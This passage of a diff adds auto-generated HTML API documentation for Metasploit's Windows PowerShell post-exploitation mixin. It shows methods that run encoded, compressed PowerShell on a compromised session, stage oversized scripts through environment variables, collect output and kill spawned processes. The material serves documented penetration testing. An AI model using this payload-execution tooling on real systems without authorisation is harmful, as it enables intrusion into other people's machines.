+    <span class='kw'>end</span>
+  <span class='kw'>end</span>
+
+  <span class='id identifier rubyid_o'>o</span><span class='period'>.</span><span class='id identifier rubyid_scan'>scan</span><span class='lparen'>(</span><span class='tstring'><span class='regexp_beg'>/</span><span class='tstring_content'>[\d \-]+</span><span class='regexp_end'>/</span></span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_last'>last</span><span class='period'>.</span><span class='id identifier rubyid_split'>split</span><span class='lbracket'>[</span><span class='int'>0</span><span class='comma'>,</span> <span class='int'>2</span><span class='rbracket'>]</span> <span class='op'>*</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>.</span><span class='tstring_end'>&#39;</span></span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="get_ps_output-instance_method">
+  
+    #<strong>get_ps_output</strong>(cmd_out, eof, read_wait = 5)  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Reads output of the command channel and empties the buffer. Will optionally log command output to disk.</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+220
+221
+222
+223
+224
+225
+226
+227
+228
+229
+230
+231
+232
+233
+234
+235
+236
+237
+238
+239
+240
+241
+242
+243
+244
+245
+246
+247
+248
+249
+250
+251
+252
+253
+254
+255
+256
+257
+258</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/post/windows/powershell.rb', line 220</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_get_ps_output'>get_ps_output</span><span class='lparen'>(</span><span class='id identifier rubyid_cmd_out'>cmd_out</span><span class='comma'>,</span> <span class='id identifier rubyid_eof'>eof</span><span class='comma'>,</span> <span class='id identifier rubyid_read_wait'>read_wait</span> <span class='op'>=</span> <span class='int'>5</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_results'>results</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span>
+
+  <span class='kw'>if</span> <span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Powershell::Post::log_output</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span>
+    <span class='comment'># Get target&#39;s computer name
+</span>    <span class='id identifier rubyid_computer_name'>computer_name</span> <span class='op'>=</span> <span class='id identifier rubyid_session'>session</span><span class='period'>.</span><span class='id identifier rubyid_sys'>sys</span><span class='period'>.</span><span class='id identifier rubyid_config'>config</span><span class='period'>.</span><span class='id identifier rubyid_sysinfo'>sysinfo</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Computer</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span>
+
+    <span class='comment'># Create unique log directory
+</span>    <span class='id identifier rubyid_log_dir'>log_dir</span> <span class='op'>=</span> <span class='op'>::</span><span class='const'>File</span><span class='period'>.</span><span class='id identifier rubyid_join'>join</span><span class='lparen'>(</span><span class='const'><span class='object_link'><a href="../../../Msf.html" title="Msf (module)">Msf</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../../Config.html" title="Msf::Config (class)">Config</a></span></span><span class='period'>.</span><span class='id identifier rubyid_log_directory'><span class='object_link'><a href="../../Config.html#log_directory-class_method" title="Msf::Config.log_directory (method)">log_directory</a></span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>scripts</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>powershell</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='id identifier rubyid_computer_name'>computer_name</span><span class='rparen'>)</span>
+    <span class='op'>::</span><span class='const'>FileUtils</span><span class='period'>.</span><span class='id identifier rubyid_mkdir_p'>mkdir_p</span><span class='lparen'>(</span><span class='id identifier rubyid_log_dir'>log_dir</span><span class='rparen'>)</span>
+
+    <span class='comment'># Define log filename
+</span>    <span class='id identifier rubyid_time_stamp'>time_stamp</span>  <span class='op'>=</span> <span class='op'>::</span><span class='const'>Time</span><span class='period'>.</span><span class='id identifier rubyid_now'>now</span><span class='period'>.</span><span class='id identifier rubyid_strftime'>strftime</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>%Y%m%d:%H%M%S</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
+    <span class='id identifier rubyid_log_file'>log_file</span>    <span class='op'>=</span> <span class='op'>::</span><span class='const'>File</span><span class='period'>.</span><span class='id identifier rubyid_join'>join</span><span class='lparen'>(</span><span class='id identifier rubyid_log_dir'>log_dir</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_time_stamp'>time_stamp</span><span class='embexpr_end'>}</span><span class='tstring_content'>.txt</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
+
+    <span class='comment'># Open log file for writing
+</span>    <span class='id identifier rubyid_fd'>fd</span> <span class='op'>=</span> <span class='op'>::</span><span class='const'>File</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span><span class='lparen'>(</span><span class='id identifier rubyid_log_file'>log_file</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>w+</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
+  <span class='kw'>end</span>
+
+  <span class='comment'># Read output until eof or nil return output and write to log
+</span>  <span class='id identifier rubyid_loop'>loop</span> <span class='kw'>do</span>
+    <span class='id identifier rubyid_line'>line</span> <span class='op'>=</span> <span class='op'>::</span><span class='const'>Timeout</span><span class='period'>.</span><span class='id identifier rubyid_timeout'>timeout</span><span class='lparen'>(</span><span class='id identifier rubyid_read_wait'>read_wait</span><span class='rparen'>)</span> <span class='kw'>do</span>
+      <span class='id identifier rubyid_cmd_out'>cmd_out</span><span class='period'>.</span><span class='id identifier rubyid_channel'>channel</span><span class='period'>.</span><span class='id identifier rubyid_read'>read</span>
+    <span class='kw'>end</span> <span class='kw'>rescue</span> <span class='kw'>nil</span>
+    <span class='kw'>break</span> <span class='kw'>if</span> <span class='id identifier rubyid_line'>line</span><span class='period'>.</span><span class='id identifier rubyid_nil?'>nil?</span>
+    <span class='kw'>if</span> <span class='id identifier rubyid_line'>line</span><span class='period'>.</span><span class='id identifier rubyid_sub!'>sub!</span><span class='lparen'>(</span><span class='tstring'><span class='regexp_beg'>/</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_eof'>eof</span><span class='embexpr_end'>}</span><span class='regexp_end'>/</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
+      <span class='id identifier rubyid_results'>results</span> <span class='op'>&lt;&lt;</span> <span class='id identifier rubyid_line'>line</span>
+      <span class='id identifier rubyid_fd'>fd</span><span class='period'>.</span><span class='id identifier rubyid_write'>write</span><span class='lparen'>(</span><span class='id identifier rubyid_line'>line</span><span class='rparen'>)</span> <span class='kw'>if</span> <span class='id identifier rubyid_fd'>fd</span>
+      <span class='kw'>break</span>
+    <span class='kw'>end</span>
+    <span class='id identifier rubyid_results'>results</span> <span class='op'>&lt;&lt;</span> <span class='id identifier rubyid_line'>line</span>
+    <span class='id identifier rubyid_fd'>fd</span><span class='period'>.</span><span class='id identifier rubyid_write'>write</span><span class='lparen'>(</span><span class='id identifier rubyid_line'>line</span><span class='rparen'>)</span> <span class='kw'>if</span> <span class='id identifier rubyid_fd'>fd</span>
+  <span class='kw'>end</span>
+
+  <span class='comment'># Close log file
+</span>  <span class='id identifier rubyid_fd'>fd</span><span class='period'>.</span><span class='id identifier rubyid_close'>close</span> <span class='kw'>if</span> <span class='id identifier rubyid_fd'>fd</span>
+
+  <span class='id identifier rubyid_results'>results</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="get_ps_pids-instance_method">
+  
+    #<strong>get_ps_pids</strong>(pids = [])  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Get/compare list of current PS processes - nested execution can spawn many children doing checks before and after execution allows us to kill more children… This is a hack, better solutions are welcome since this could kill user spawned powershell windows created between comparisons.</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+63
+64
+65
+66
+67
+68</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/post/windows/powershell.rb', line 63</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_get_ps_pids'>get_ps_pids</span><span class='lparen'>(</span><span class='id identifier rubyid_pids'>pids</span> <span class='op'>=</span> <span class='lbracket'>[</span><span class='rbracket'>]</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_current_pids'>current_pids</span> <span class='op'>=</span> <span class='id identifier rubyid_session'>session</span><span class='period'>.</span><span class='id identifier rubyid_sys'>sys</span><span class='period'>.</span><span class='id identifier rubyid_process'>process</span><span class='period'>.</span><span class='id identifier rubyid_get_processes'>get_processes</span><span class='period'>.</span><span class='id identifier rubyid_keep_if'>keep_if</span> <span class='lbrace'>{</span> <span class='op'>|</span><span class='id identifier rubyid_p'>p</span><span class='op'>|</span> <span class='id identifier rubyid_p'>p</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>name</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_casecmp'>casecmp</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>powershell.exe</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_zero?'>zero?</span> <span class='rbrace'>}</span><span class='period'>.</span><span class='id identifier rubyid_map'>map</span> <span class='lbrace'>{</span> <span class='op'>|</span><span class='id identifier rubyid_p'>p</span><span class='op'>|</span> <span class='id identifier rubyid_p'>p</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>pid</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span> <span class='rbrace'>}</span>
+  <span class='comment'># Subtract previously known pids
+</span>  <span class='id identifier rubyid_current_pids'>current_pids</span> <span class='op'>=</span> <span class='lparen'>(</span><span class='id identifier rubyid_current_pids'>current_pids</span> <span class='op'>-</span> <span class='id identifier rubyid_pids'>pids</span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_uniq'>uniq</span>
+  <span class='id identifier rubyid_current_pids'>current_pids</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="have_powershell?-instance_method">
+  
+    #<strong>have_powershell?</strong>  &#x21d2; <tt>Boolean</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Returns true if powershell is installed</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+<p class="tag_title">Returns:</p>
+<ul class="return">
+  
+    <li>
+      
+      
+        <span class='type'>(<tt>Boolean</tt>)</span>
+      
+      
+      
+    </li>
+  
+</ul>
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+28
+29
+30</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/post/windows/powershell.rb', line 28</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_have_powershell?'>have_powershell?</span>
+  <span class='id identifier rubyid_cmd_exec'>cmd_exec</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>cmd.exe</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>/c &quot;echo. | powershell get-host&quot;</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span> <span class='op'>=~</span> <span class='tstring'><span class='regexp_beg'>/</span><span class='tstring_content'>Name.*Version.*InstanceId</span><span class='regexp_end'>/m</span></span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="initialize-instance_method">
+  
+    #<strong>initialize</strong>(info = {})  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/post/windows/powershell.rb', line 12</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_initialize'>initialize</span><span class='lparen'>(</span><span class='id identifier rubyid_info'>info</span> <span class='op'>=</span> <span class='lbrace'>{</span><span class='rbrace'>}</span><span class='rparen'>)</span>
+  <span class='kw'>super</span>
+  <span class='id identifier rubyid_register_advanced_options'>register_advanced_options</span><span class='lparen'>(</span>
+    <span class='lbracket'>[</span>
+      <span class='const'><span class='object_link'><a href="../../OptInt.html" title="Msf::OptInt (class)">OptInt</a></span></span><span class='period'>.</span><span class='id identifier rubyid_new'><span class='object_link'><a href="../../OptBase.html#initialize-instance_method" title="Msf::OptBase#initialize (method)">new</a></span></span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Powershell::Post::timeout</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span>
+                 <span class='lbracket'>[</span><span class='kw'>true</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Powershell execution timeout, set &lt; 0 to run async without termination</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='int'>15</span><span class='rbracket'>]</span><span class='rparen'>)</span><span class='comma'>,</span>
+      <span class='const'><span class='object_link'><a href="../../OptBool.html" title="Msf::OptBool (class)">OptBool</a></span></span><span class='period'>.</span><span class='id identifier rubyid_new'><span class='object_link'><a href="../../OptBool.html#initialize-instance_method" title="Msf::OptBool#initialize (method)">new</a></span></span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Powershell::Post::log_output</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='lbracket'>[</span><span class='kw'>true</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Write output to log file</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='kw'>false</span><span class='rbracket'>]</span><span class='rparen'>)</span><span class='comma'>,</span>
+      <span class='const'><span class='object_link'><a href="../../OptBool.html" title="Msf::OptBool (class)">OptBool</a></span></span><span class='period'>.</span><span class='id identifier rubyid_new'><span class='object_link'><a href="../../OptBool.html#initialize-instance_method" title="Msf::OptBool#initialize (method)">new</a></span></span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Powershell::Post::dry_run</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='lbracket'>[</span><span class='kw'>true</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Return encoded output to caller</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='kw'>false</span><span class='rbracket'>]</span><span class='rparen'>)</span><span class='comma'>,</span>
+      <span class='const'><span class='object_link'><a href="../../OptBool.html" title="Msf::OptBool (class)">OptBool</a></span></span><span class='period'>.</span><span class='id identifier rubyid_new'><span class='object_link'><a href="../../OptBool.html#initialize-instance_method" title="Msf::OptBool#initialize (method)">new</a></span></span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Powershell::Post::force_wow64</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='lbracket'>[</span><span class='kw'>true</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Force WOW64 execution</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='kw'>false</span><span class='rbracket'>]</span><span class='rparen'>)</span><span class='comma'>,</span>
+    <span class='rbracket'>]</span><span class='comma'>,</span> <span class='kw'>self</span><span class='period'>.</span><span class='id identifier rubyid_class'>class</span>
+  <span class='rparen'>)</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="psh_exec-instance_method">
+  
+    #<strong>psh_exec</strong>(script, greedy_kill = true, ps_cleanup = true)  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Simple script execution wrapper, performs all steps required to execute a string of powershell. This method will try to kill all powershell.exe PIDs which appeared during its execution, set greedy_kill to false if this is not desired.</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+301
+302
+303
+304
+305
+306
+307
+308
+309
+310
+311
+312
+313
+314
+315
+316
+317
+318
+319
+320
+321
+322
+323
+324
+325
+326
+327
+328
+329
+330
+331
+332
+333
+334
+335
+336
+337
+338
+339
+340
+341
+342
+343
+344
+345
+346
+347</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/post/windows/powershell.rb', line 301</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_psh_exec'>psh_exec</span><span class='lparen'>(</span><span class='id identifier rubyid_script'>script</span><span class='comma'>,</span> <span class='id identifier rubyid_greedy_kill'>greedy_kill</span> <span class='op'>=</span> <span class='kw'>true</span><span class='comma'>,</span> <span class='id identifier rubyid_ps_cleanup'>ps_cleanup</span> <span class='op'>=</span> <span class='kw'>true</span><span class='rparen'>)</span>
+  <span class='comment'># Define vars
+</span>  <span class='id identifier rubyid_eof'>eof</span> <span class='op'>=</span> <span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_rand_text_alpha'>rand_text_alpha</span><span class='lparen'>(</span><span class='int'>8</span><span class='rparen'>)</span>
+  <span class='comment'># eof = &quot;THIS__SCRIPT_HAS__COMPLETED_EXECUTION#{rand(100)}&quot;
+</span>  <span class='id identifier rubyid_env_suffix'>env_suffix</span> <span class='op'>=</span> <span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_rand_text_alpha'>rand_text_alpha</span><span class='lparen'>(</span><span class='int'>8</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_script'>script</span> <span class='op'>=</span> <span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Powershell</span><span class='op'>::</span><span class='const'>Script</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span><span class='lparen'>(</span><span class='id identifier rubyid_script'>script</span><span class='rparen'>)</span> <span class='kw'>unless</span> <span class='id identifier rubyid_script'>script</span><span class='period'>.</span><span class='id identifier rubyid_respond_to?'>respond_to?</span><span class='lparen'>(</span><span class='symbol'>:compress_code</span><span class='rparen'>)</span>
+
+  <span class='comment'># Check to ensure base64 encoding - regex format and content length division
+</span>  <span class='kw'>unless</span> <span class='id identifier rubyid_script'>script</span><span class='period'>.</span><span class='id identifier rubyid_to_s'>to_s</span><span class='period'>.</span><span class='id identifier rubyid_match'>match</span><span class='lparen'>(</span><span class='tstring'><span class='regexp_beg'>/</span><span class='tstring_content'>[A-Za-z0-9+\/]+={0,3}</span><span class='regexp_end'>/</span></span><span class='rparen'>)</span><span class='lbracket'>[</span><span class='int'>0</span><span class='rbracket'>]</span> <span class='op'>==</span> <span class='id identifier rubyid_script'>script</span><span class='period'>.</span><span class='id identifier rubyid_to_s'>to_s</span> <span class='op'>&amp;&amp;</span> <span class='lparen'>(</span><span class='id identifier rubyid_script'>script</span><span class='period'>.</span><span class='id identifier rubyid_to_s'>to_s</span><span class='period'>.</span><span class='id identifier rubyid_length'>length</span> <span class='op'>%</span> <span class='int'>4</span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_zero?'>zero?</span>
+    <span class='id identifier rubyid_script'>script</span> <span class='op'>=</span> <span class='id identifier rubyid_encode_script'>encode_script</span><span class='lparen'>(</span><span class='id identifier rubyid_compress_script'>compress_script</span><span class='lparen'>(</span><span class='id identifier rubyid_script'>script</span><span class='period'>.</span><span class='id identifier rubyid_to_s'>to_s</span><span class='comma'>,</span> <span class='id identifier rubyid_eof'>eof</span><span class='rparen'>)</span><span class='comma'>,</span> <span class='id identifier rubyid_eof'>eof</span><span class='rparen'>)</span>
+  <span class='kw'>end</span>
+
+  <span class='kw'>if</span> <span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Powershell::Post::dry_run</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span>
+    <span class='kw'>return</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>powershell -EncodedCommand </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_script'>script</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span>
+  <span class='kw'>else</span>
+    <span class='comment'># Check 8k cmd buffer limit, stage if needed
+</span>    <span class='kw'>if</span> <span class='id identifier rubyid_script'>script</span><span class='period'>.</span><span class='id identifier rubyid_size'>size</span> <span class='op'>&gt;</span> <span class='int'>8100</span>
+      <span class='id identifier rubyid_vprint_error'>vprint_error</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Compressed size: </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_script'>script</span><span class='period'>.</span><span class='id identifier rubyid_size'>size</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span>
+      <span class='id identifier rubyid_error_msg'>error_msg</span> <span class='op'>=</span>  <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Compressed size may cause command to exceed </span><span class='tstring_end'>&quot;</span></span> \
+                   <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>cmd.exe&#39;s 8kB character limit.</span><span class='tstring_end'>&quot;</span></span>
+      <span class='id identifier rubyid_vprint_error'>vprint_error</span> <span class='id identifier rubyid_error_msg'>error_msg</span>
+      <span class='id identifier rubyid_vprint_good'>vprint_good</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Launching stager:</span><span class='tstring_end'>&#39;</span></span>
+      <span class='id identifier rubyid_script'>script</span> <span class='op'>=</span> <span class='id identifier rubyid_stage_cmd_env'>stage_cmd_env</span><span class='lparen'>(</span><span class='id identifier rubyid_script'>script</span><span class='comma'>,</span> <span class='id identifier rubyid_env_suffix'>env_suffix</span><span class='rparen'>)</span>
+      <span class='id identifier rubyid_print_good'><span class='object_link'><a href="../../../top-level-namespace.html#print_good-instance_method" title="#print_good (method)">print_good</a></span></span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Payload successfully staged.</span><span class='tstring_end'>&quot;</span></span>
+    <span class='kw'>else</span>
+      <span class='id identifier rubyid_print_good'><span class='object_link'><a href="../../../top-level-namespace.html#print_good-instance_method" title="#print_good (method)">print_good</a></span></span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Compressed size: </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_script'>script</span><span class='period'>.</span><span class='id identifier rubyid_size'>size</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span>
+    <span class='kw'>end</span>
+
+    <span class='id identifier rubyid_vprint_good'>vprint_good</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Final command </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_script'>script</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span>
+
+    <span class='comment'># Execute the script, get the output, and kill the resulting PIDs
+</span>    <span class='id identifier rubyid_cmd_out'>cmd_out</span><span class='comma'>,</span> <span class='id identifier rubyid_running_pids'>running_pids</span><span class='comma'>,</span> <span class='id identifier rubyid_open_channels'>open_channels</span> <span class='op'>=</span> <span class='id identifier rubyid_execute_script'>execute_script</span><span class='lparen'>(</span><span class='id identifier rubyid_script'>script</span><span class='comma'>,</span> <span class='id identifier rubyid_greedy_kill'>greedy_kill</span><span class='rparen'>)</span>
+    <span class='kw'>if</span> <span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Powershell::Post::timeout</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_to_i'>to_i</span> <span class='op'>&lt;</span> <span class='int'>0</span>
+      <span class='id identifier rubyid_out'>out</span> <span class='op'>=</span>  <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Started async execution of </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_running_pids'>running_pids</span><span class='period'>.</span><span class='id identifier rubyid_join'>join</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>, </span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>, output collection and cleanup will not be performed</span><span class='tstring_end'>&quot;</span></span>
+      <span class='comment'># print_error out
+</span>      <span class='kw'>return</span> <span class='id identifier rubyid_out'>out</span>
+    <span class='kw'>end</span>
+    <span class='id identifier rubyid_ps_output'>ps_output</span> <span class='op'>=</span> <span class='id identifier rubyid_get_ps_output'>get_ps_output</span><span class='lparen'>(</span><span class='id identifier rubyid_cmd_out'>cmd_out</span><span class='comma'>,</span> <span class='id identifier rubyid_eof'>eof</span><span class='comma'>,</span> <span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Powershell::Post::timeout</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='rparen'>)</span>
+    <span class='comment'># Kill off the resulting processes if needed
+</span>    <span class='kw'>if</span> <span class='id identifier rubyid_ps_cleanup'>ps_cleanup</span>
+      <span class='id identifier rubyid_vprint_good'>vprint_good</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Cleaning up </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_running_pids'>running_pids</span><span class='period'>.</span><span class='id identifier rubyid_join'>join</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>, </span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span>
+      <span class='id identifier rubyid_clean_up'>clean_up</span><span class='lparen'>(</span><span class='kw'>nil</span><span class='comma'>,</span> <span class='id identifier rubyid_eof'>eof</span><span class='comma'>,</span> <span class='id identifier rubyid_running_pids'>running_pids</span><span class='comma'>,</span> <span class='id identifier rubyid_open_channels'>open_channels</span><span class='comma'>,</span> <span class='id identifier rubyid_env_suffix'>env_suffix</span><span class='comma'>,</span> <span class='kw'>false</span><span class='rparen'>)</span>
+    <span class='kw'>end</span>
+
+    <span class='kw'>return</span> <span class='id identifier rubyid_ps_output'>ps_output</span>
+  <span class='kw'>end</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="stage_cmd_env-instance_method">
+  
+    #<strong>stage_cmd_env</strong>(compressed_script, env_suffix = Rex::Text.rand_text_alpha(8))  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Powershell scripts that are longer than 8000 bytes are split into 8000 byte chunks and stored as CMD environment variables. A new powershell script is built that will reassemble the chunks and execute the script. Returns the reassembly script.</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+116
+117
+118
+119
+120
+121
+122
+123
+124
+125
+126
+127
+128
+129
+130
+131
+132
+133
+134
+135
+136
+137
+138
+139
+140
+141
+142
+143
+144
+145
+146
+147
+148
+149
+150
+151
+152
+153
+154
+155
+156
+157
+158</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/post/windows/powershell.rb', line 116</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_stage_cmd_env'>stage_cmd_env</span><span class='lparen'>(</span><span class='id identifier rubyid_compressed_script'>compressed_script</span><span class='comma'>,</span> <span class='id identifier rubyid_env_suffix'>env_suffix</span> <span class='op'>=</span> <span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_rand_text_alpha'>rand_text_alpha</span><span class='lparen'>(</span><span class='int'>8</span><span class='rparen'>)</span><span class='rparen'>)</span>
+  <span class='comment'># Check to ensure script is encoded and compressed
